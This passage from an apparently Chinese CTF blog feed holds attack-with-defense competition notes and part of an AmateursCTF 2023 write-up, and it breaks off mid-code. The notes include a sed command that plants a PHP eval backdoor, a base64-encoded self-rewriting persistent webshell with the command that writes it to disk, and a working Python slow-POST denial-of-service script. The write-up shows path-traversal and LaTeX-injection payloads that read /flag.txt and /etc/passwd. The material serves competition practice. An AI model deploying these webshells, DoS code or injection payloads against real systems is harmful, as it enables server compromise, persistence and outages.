function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'1i&lt;?php eval(\$_POST[czy]);?>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p>PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgIEB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLmN6eS5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJjenkiXSk9PSIyYzNiM2I1MmViODMzYmE2NjEzNGFhMWIzOTcwYjM5MSIpe0BldmFsKCRfUE9TVFsiY3p5Il0pO30&#x2F;Pic7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJGNvZGUpOwogICAgICAgIHVzbGVlcCg1MDApOwogICAgfQo&#x2F;Pg&#x3D;&#x3D;</p></blockquote><p></p><blockquote><p>system(echo PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgIEB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLmN6eS5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJjenkiXSk9PSIyYzNiM2I1MmViODMzYmE2NjEzNGFhMWIzOTcwYjM5MSIpe0BldmFsKCRfUE9TVFsiY3p5Il0pO30&#x2F;Pic7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJGNvZGUpOwogICAgICAgIHVzbGVlcCg1MDApOwogICAgfQo&#x2F;Pg&#x3D;&#x3D;|base64 -d &gt;.czy.php);</p></blockquote><p></p><blockquote><?phpignore_user_abort(true);set_time_limit(0);@unlink(__FILE__);$file = '.czy.php';$code = '<?php if(md5($_GET["czy"])=="2c3b3b52eb833ba66134aa1b3970b391"){@eval($_POST["czy"]);}?><p>;<br>while (1){<br>  file_put_contents($file,$code);<br>  usleep(500);<br>}<br>?&gt;</p><p>payloadGET    .czy.php&#x2F;?czy&#x3D;ag@ctf</p><p>POST    czy&#x3D;phpinfo();</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ssh <span class="token operator">&lt;</span><span class="token operator">-</span>p <span class="token operator">></span> username@ipscp   username@ip<span class="token operator">:</span>cat <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>bash_history#<span class="token number">5</span>last <span class="token operator">-</span>n <span class="token number">5</span><span class="token operator">|</span>awk <span class="token string">'&#123;print $1&#125;'</span>#<span class="token operator">/</span>etc<span class="token operator">/</span>passwdcat <span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span class="token operator">|</span>awk <span class="token operator">-</span><span class="token constant">F</span> <span class="token string">':'</span> <span class="token string">'&#123;print $1&#125;'</span>#<span class="token constant">UID</span><span class="token number">0</span>awk <span class="token operator">-</span><span class="token constant">F</span><span class="token operator">:</span> <span class="token string">'&#123;if($3==0)print $1&#125;'</span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd#<span class="token number">777</span>find <span class="token punctuation">.</span> <span class="token operator">-</span>name <span class="token string">"*.php"</span> <span class="token operator">-</span>perm <span class="token number">4777</span>#<span class="token number">24</span><span class="token constant">PHP</span>find <span class="token punctuation">.</span><span class="token operator">/</span> <span class="token operator">-</span>mtime <span class="token number">0</span> <span class="token operator">-</span>name <span class="token string">"*.php"</span>#ps aux <span class="token operator">|</span> grep pid#netstat <span class="token operator">-</span>antulp <span class="token operator">|</span> grep <span class="token constant">EST</span>#lsof <span class="token operator">-</span>i<span class="token operator">:</span>  netstat <span class="token operator">-</span>tunlp<span class="token operator">|</span>grep #kill <span class="token constant">PID</span>killall <span class="token operator">&lt;</span><span class="token operator">></span>pkill <span class="token operator">&lt;</span><span class="token operator">></span>pkill <span class="token operator">-</span>u#<span class="token constant">IP</span>ipiptables <span class="token operator">-</span><span class="token constant">I</span> <span class="token constant">INPUT</span> <span class="token operator">-</span>s source_ip<span class="token punctuation">[</span><span class="token operator">/</span>mask<span class="token punctuation">]</span> <span class="token operator">-</span>j <span class="token constant">DROP</span>#sshiptable <span class="token operator">-</span>t filter <span class="token operator">-</span><span class="token constant">A</span> <span class="token constant">INPUT</span> <span class="token operator">-</span>s source_ip<span class="token punctuation">[</span><span class="token operator">/</span>mask<span class="token punctuation">]</span> <span class="token operator">-</span>p tcp <span class="token operator">--</span>dport <span class="token number">22</span> <span class="token operator">-</span>j <span class="token constant">DROP</span>#mysqlmysqldump <span class="token operator">-</span>u  <span class="token operator">-</span>p   <span class="token operator">></span> bak<span class="token punctuation">.</span>sqlmysqldump <span class="token operator">--</span>all<span class="token operator">-</span>databases <span class="token operator">></span> bak<span class="token punctuation">.</span>sql#mysqlmysql <span class="token operator">-</span>u  <span class="token operator">-</span>p   <span class="token operator">&lt;</span> bak<span class="token punctuation">.</span>sql#shell scriptcrontab <span class="token punctuation">[</span><span class="token operator">-</span>u user<span class="token punctuation">]</span> file_namecrontab <span class="token punctuation">[</span><span class="token operator">-</span>u user<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>e <span class="token operator">|</span><span class="token operator">-</span>l<span class="token operator">|</span> <span class="token operator">-</span>r<span class="token punctuation">]</span>#tcpnetstat <span class="token operator">-</span>ant<span class="token operator">|</span>awk<span class="token operator">|</span>grep<span class="token operator">|</span>sed <span class="token operator">-</span>e <span class="token operator">-</span>e<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn#<span class="token constant">IP</span>cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token operator">|</span>cut <span class="token operator">-</span>f1 <span class="token operator">-</span>d<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>k  <span class="token operator">-</span>r<span class="token operator">|</span>head <span class="token operator">-</span>#<span class="token constant">URL</span>cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token operator">|</span>cut <span class="token operator">-</span>f4 <span class="token operator">-</span>d<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>k  <span class="token operator">-</span>r<span class="token operator">|</span>head <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><blockquote><p></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token builtin">max</span><span class="token operator">=</span><span class="token number">90000000</span>port<span class="token operator">=</span><span class="token number">80</span>                 <span class="token comment">#</span>host<span class="token operator">=</span><span class="token string">"192.168.92.154"</span>   <span class="token comment">#IP</span>page<span class="token operator">=</span><span class="token string">"/index.php"</span>bag<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"POST %s HTTP/1.1\r\n"</span>    <span class="token string">"host: %s\r\n"</span>    <span class="token string">"Content-Length: 1000000000\r\n"</span>    <span class="token string">"Cookie: 1998\r\n"</span>    <span class="token string">"\r\n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>page<span class="token punctuation">,</span>host<span class="token punctuation">)</span><span class="token punctuation">)</span>socks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> socks    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">max</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>            s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>bag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            socks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> socks    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> socks<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...."</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>                socks<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>One <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>connect<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Two <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>One<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>Two<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AmateursCTF 2023wp</title>
      <link href="/2023/07/22/AmateursCTF-2023wp/"/>
      <url>/2023/07/22/AmateursCTF-2023wp/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://img-blog.csdnimg.cn/a940c784ee9a4fe2a043298e02b63070.png" alt="1"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>D :sob:</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="waiting-an-eternity"><a href="#waiting-an-eternity" class="headerlink" title="waiting-an-eternity"></a>waiting-an-eternity</h3><blockquote><p></p></blockquote><p><br><img src="https://img-blog.csdnimg.cn/fe692516b6d34fd1a7d34a9ef06f5ac3.png" alt="1"><br>&#x3D;&#x3D;set-cookie&#x3D;&#x3D;<br><img src="https://img-blog.csdnimg.cn/d81d9bdd78184662817b7438e9768d5d.png" alt="2"><br>cookie<br><img src="https://img-blog.csdnimg.cn/4913065b3b7b455ba1e53e5bda386c75.png" alt="3"><br>timeflag<br><img src="https://img-blog.csdnimg.cn/4ea4d69f2e8547b49ed15020b7e5b1f0.png" alt="3"><br>&#x3D;&#x3D;-inf&#x2F;-Infinity&#x3D;&#x3D;</p><h3 id="funny-factorials"><a href="#funny-factorials" class="headerlink" title="funny factorials"></a>funny factorials</h3><blockquote><p></p></blockquote><p><img src="https://img-blog.csdnimg.cn/3fdd0c83d0df415aa50ec3172aa80238.png" alt="1"></p><p><code>/?theme=themes/theme1.css</code><br>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token keyword">import</span> sysapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> n <span class="token operator">*</span> factorial<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">filter_path</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print(path)</span>    path <span class="token operator">=</span> path<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> filter_path<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>        <span class="token comment"># remove root / from path if it exists</span>        <span class="token keyword">if</span> path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>            path <span class="token operator">=</span> path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">return</span> path<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calculate_factorial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>        result <span class="token operator">=</span> factorial<span class="token punctuation">(</span>num<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    sys<span class="token punctuation">.</span>setrecursionlimit<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dockerfile</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM python:3.10-slim-busterRUN pip3 <span class="token function">install</span> flaskCOPY flag.txt /WORKDIR /appCOPY app/* /app/copy app/templates/* /app/templates/copy app/themes/* /app/themes/EXPOSE <span class="token number">5000</span>ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"python3"</span>, <span class="token string">"app.py"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagflag.txt<code>path = path.replace(&quot;../&quot;, &quot;&quot;)</code><code>../</code><br><code>//flag.txt..///flag.txt</code><br><img src="https://img-blog.csdnimg.cn/0f66898d59574faf8b13befd85b71cee.png" alt="1"></p><h3 id="latek"><a href="#latek" class="headerlink" title="latek"></a>latek</h3><blockquote><p>bryanguoctflatek<br>&#x2F;flag.txt</p></blockquote><p><img src="https://img-blog.csdnimg.cn/3730939722a3412fb00a4fd24179ee9c.png" alt="1"><br>LaTexpdf<a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection"></a>LaTex</p><p></p><blockquote><p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\input{&#x2F;flag.txt}<br>\end{document} </p></blockquote><p>flag<br><img src="https://img-blog.csdnimg.cn/fbb8040055734064a248c8036fd23c2c.png" alt="1"><br>wp</p><blockquote><p>\batchmode LaTeX  LaTeX</p></blockquote><blockquote><p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\batchmode<br>\input{&#x2F;flag.txt}<br>\end{document} </p></blockquote><blockquote><p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\usepackage{verbatim}<br>\verbatiminput{&#x2F;etc&#x2F;passwd}<br>\end{document} </p></blockquote><blockquote><p>LaTeX\usepackage{verbatim}verbatimverbatim</p></blockquote><p><img src="https://img-blog.csdnimg.cn/af8f210f009944a088f99b6809eb579f.png" alt="1"><br><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection"></a><br><a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection"></a></p><h3 id="uwuctf"><a href="#uwuctf" class="headerlink" title="uwuctf"></a>uwuctf</h3><blockquote><p> rust uwuifier uwuifier <br>zip challenge.yml flag.txt</p></blockquote><p><img src="https://img-blog.csdnimg.cn/ef485e2862cb42e8883d69eae95ea0a5.png" alt="1"><br>LFI<code>../</code>wp<br>index.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"dotenv"</span><span class="token punctuation">;</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> fs <span class="token keyword">from</span> <span class="token string">"fs"</span><span class="token punctuation">;</span><span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">"path"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>quote<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"shell-quote"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>exec<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"child_process"</span><span class="token punctuation">;</span><span class="token keyword">const</span> textsDir <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"texts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> uwuifierPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"uwuify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">"express"</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> morgan <span class="token keyword">from</span> <span class="token string">"morgan"</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'trust proxy'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'loopback'</span><span class="token punctuation">,</span> <span class="token string">'linklocal'</span><span class="token punctuation">,</span> <span class="token string">'uniquelocal'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">"combined"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">"public/index.html"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">root</span><span class="token operator">:</span> process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// bug fix</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/uwuify"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no hacking >:("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"cat "</span> <span class="token operator">+</span> <span class="token function">quote</span><span class="token punctuation">(</span><span class="token punctuation">[</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" | "</span> <span class="token operator">+</span> uwuifierPath<span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">cwd</span><span class="token operator">:</span> textsDir    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>stdout <span class="token operator">+</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no src provided"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/dir"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> output <span class="token 